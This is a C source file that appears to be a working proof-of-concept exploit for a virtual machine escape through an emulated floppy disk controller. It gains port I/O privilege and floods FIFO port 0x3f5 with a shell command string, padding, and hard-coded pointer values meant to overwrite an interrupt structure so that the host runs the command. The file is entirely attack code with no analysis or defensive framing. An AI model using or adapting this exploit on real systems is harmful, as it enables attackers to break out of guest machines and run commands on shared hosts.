#include<stdio.h>
#include<sys/io.h>
#define FIFO 0x3f5
#define RDID 0x0a
#define SPC_COMMAND 0x8e
#define BH_COUNT 0x1660
#define SH_POSITION 0x1ff
#define SH_COUNT 7
#define TEST_VAL  0x11
#define FD_CMD_READ 0x06
#define WRITE 0x05
#define NUM_STRUCT 0x00
#define STRUCT_LEN 0x28
int main(void){

		char irq[8] =    {0x30,0xd2,0xd2,0xf3,0xff,0x7f,0x00,0x00};
		char opaque[8] =    {0x00,0x0c,0x1f,0x56,0x55,0x55,0x00,0x00};
		char n[8] =    {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
		unsigned char code[] = "> testfile";  //this can be a input of the function
        int len_of_command = sizeof(code)/(sizeof(char));
        code[len_of_command] = '\0';
        len_of_command++;
        printf("len = %d\n", len_of_command);
        //open up port and set permission
        iopl(3);
        ioperm(FIFO, 1, 1);
        outb(SPC_COMMAND, FIFO);
       	
        int i;
        int j = BH_COUNT-len_of_command;

     
        //write command
        for(i=0;i<len_of_command; i++){
            outb(code[i], FIFO);
        }

        // go to irq struct
        for(i=0; i<j; i++){
            outb(TEST_VAL, FIFO);
        }
        
        //start to rewrite
        int k;
        for(k=0; k<20; k++){
        	for(i=0; i< 8; i++){
	            outb(irq[i], FIFO);
	        }
	        for(i=0; i< 8; i++){
	            outb(opaque[i], FIFO);
	        }
	        for(i=0; i< 8; i++){
	            outb(n[i], FIFO);
	        }
        }
      

}
